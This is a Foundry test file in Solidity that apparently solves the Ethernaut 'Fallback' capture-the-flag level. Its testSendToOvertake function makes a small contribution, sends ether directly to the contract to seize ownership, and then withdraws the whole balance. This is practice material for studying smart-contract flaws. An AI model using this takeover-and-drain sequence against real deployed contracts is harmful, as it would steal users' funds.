// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
  Fallback public fallbackContract;

  function setUp() public {
    fallbackContract = new Fallback();
  }

  function testDefaultOwner() public {
    emit log_address(address(this));
    assertEq(fallbackContract.owner(), address(this));
  }

  function testContribute() public {
    // My address(this) has a balance from deploying fallback,
    // test w/ bob instead who starts fresh
    address bob = address(0x1);
    vm.startPrank(bob);
    vm.deal(bob, 10 ether); // Fund bob
    emit log_uint(address(this).balance);

    assertEq(fallbackContract.getContribution(), 0);
    emit log_uint(fallbackContract.getContribution());
    emit log_address(address(this));
    fallbackContract.contribute{value: 0.0001 ether}();
    assertEq(fallbackContract.getContribution(), 0.0001 ether);
  }

  function testSendToOvertake() public {
    // Start same as test above, but finish it off
    address payable bob = payable(address(0x1));
    address payable alice = payable(address(0x2));
    vm.deal(bob, 100 ether); // Fund bob
    vm.deal(alice, 100 ether); // Fund alice
  
    vm.prank(address(bob));// contribute as bob
    fallbackContract.contribute{value: 0.0001 ether}();
    vm.prank(address(alice)); // contribute as alice
    fallbackContract.contribute{value: 0.000199 ether}();

    emit log_uint(payable(address(fallbackContract)).balance);

    // Claim owner as alice, check balance
    vm.prank(address(alice));
    (bool sent, ) = address(fallbackContract).call{value: 1 ether}("");
    require(sent, "Alice Failed to send Ether to the level");
    assertEq(fallbackContract.owner(), address(alice));
  
    emit log_uint(payable(address(fallbackContract)).balance);

    // Now send to receieve and be owner, after owner withdraw and take 
    // Alices funds with you
    vm.prank(address(bob));
    (bool sentBob, ) = address(fallbackContract).call{value: 1}("");
    require(sentBob, "Bob Failed to send Ether to the level");
    assertEq(fallbackContract.owner(), address(bob));
    
    vm.prank(address(bob));
    fallbackContract.withdraw();

    assertEq(payable(address(fallbackContract)).balance, 0);
    assertEq(fallbackContract.owner(), address(bob));
  }

}